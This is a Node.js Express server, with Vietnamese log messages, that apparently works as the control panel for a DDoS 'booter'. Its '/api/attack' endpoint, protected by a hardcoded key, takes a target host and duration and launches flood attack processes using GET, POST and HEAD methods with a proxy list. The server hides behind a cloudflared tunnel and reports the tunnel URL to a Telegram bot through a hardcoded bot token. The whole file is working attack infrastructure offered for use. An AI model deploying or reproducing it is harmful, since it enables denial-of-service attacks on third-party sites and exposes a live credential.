const express = require("express"), { spawn } = require("child_process"), axios = require("axios");
const app = express(), port = Math.floor(Math.random() * (9999 - 999 + 1)) + 999, MAX_CONCURRENT_ATTACKS = 1, BOT_TOKEN = "7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw", CHAT_ID = "7371969470";
let activeAttacks = 0, currentPID = null;

const sendTelegramMessage = async (message) => {
  try { await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message }); console.log("Tin nhắn Telegram đã được gửi thành công."); } 
  catch (error) { console.error("Lỗi khi gửi tin nhắn Telegram:", error.message); }
};

const validateInput = ({ key, host, time, method, port }) => 
  !([key, host, time, method, port].every(Boolean)) ? "THIẾU THAM SỐ" : key !== "negan" ? "KEY KHÔNG HỢP LỆ" : time > 200 ? "THỜI GIAN PHẢI < 200S" : port < 1 || port > 65535 ? "CỔNG KHÔNG HỢP LỆ" : null;

const executeAttack = (command, time) => {
  const childProcess = spawn(command.split(" ")[0], command.split(" ").slice(1), { stdio: "inherit" });
  currentPID = childProcess.pid;
  console.log(`Tiến trình ${currentPID} đã được khởi chạy.`);

  const cleanup = () => { activeAttacks--, currentPID = null; console.log(`Tiến trình ${childProcess.pid} đã kết thúc. Slot được giải phóng.`); };

  childProcess.on("close", (code) => { console.log(`Tiến trình ${childProcess.pid} đã đóng với mã ${code}.`); cleanup(); });
  childProcess.on("error", (err) => { console.error(`Lỗi khi thực thi lệnh: ${err.message}`); cleanup(); });

  setTimeout(() => { if (currentPID === childProcess.pid) { console.error(`Tiến trình ${childProcess.pid} bị treo và đã bị hủy.`); childProcess.kill(); cleanup(); } }, time * 1000 + 10000);
};

const executeAllAttacks = (methods, host, time) => methods.map((method) => `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`).forEach((command) => executeAttack(command, time));

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul } = req.query;

  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage) return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });

  activeAttacks++;

  if (modul === "FULL") {
    executeAllAttacks(["GET", "POST", "HEAD"], host, time);
    res.json({ status: "SUCCESS", message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", host: host, port: port, time: time, modul: "GET POST HEAD", method: method, pid: currentPID });
  } else {
    const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
    executeAttack(command, time);
    res.json({ status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI", host: host, port: port, time: time, modul: modul, method: method, pid: currentPID });
  }
});

app.listen(port, () => {
  console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`);

  const cloudflaredProcess = spawn("cloudflared", ["tunnel", "--url", `http://localhost:${port}`]);
  let cloudflareUrl = "", isTunnelCreatedLine = false;

  const handleOutput = (output) => {
    output.split("\n").forEach((line) => {
      if (line.includes("Your quick Tunnel has been created! Visit it at")) isTunnelCreatedLine = true;
      else if (isTunnelCreatedLine) {
        const urlMatch = line.match(/https:\/\/[^\s]+/);
        if (urlMatch) {
          cloudflareUrl = urlMatch[0];
          console.log(`Cloudflare Tunnel đang chạy tại: ${cloudflareUrl}`);
          sendTelegramMessage(`🔹 Cloudflare Tunnel đang chạy:\n🌐 URL: ${cloudflareUrl}`).catch((err) => console.error("Lỗi khi gửi tin nhắn Telegram:", err));
          isTunnelCreatedLine = false;
        }
      }
    });
  };

  cloudflaredProcess.stdout.on("data", (data) => handleOutput(data.toString()));
  cloudflaredProcess.stderr.on("data", (data) => handleOutput(data.toString(), true));
  cloudflaredProcess.on("close", (code) => console.log(`Cloudflare Tunnel đã đóng với mã ${code}`));
  cloudflaredProcess.on("error", (err) => {
    console.error("Lỗi khi chạy Cloudflare Tunnel:", err);
    sendTelegramMessage("🔴 Lỗi khi khởi động Cloudflare Tunnel. Vui lòng kiểm tra lại.").catch((err) => console.error("Lỗi khi gửi tin nhắn Telegram:", err));
  });
});
